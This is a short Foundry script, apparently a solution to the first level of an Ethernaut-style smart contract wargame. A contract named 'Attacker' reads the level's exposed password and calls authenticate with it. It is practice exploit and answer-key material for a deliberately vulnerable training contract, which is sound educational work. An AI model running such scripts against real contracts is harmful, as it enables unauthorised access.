// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../instances/Ilevel00.sol";
import "forge-std/Script.sol";

contract Attacker is Script {
    Instance level00 = Instance(0x5B1C7313DdC00376eB60e3E4E5B83EB41906774c);

    function run() external {
        vm.startBroadcast();

        level00.authenticate(level00.password());

        vm.stopBroadcast();
    }
}
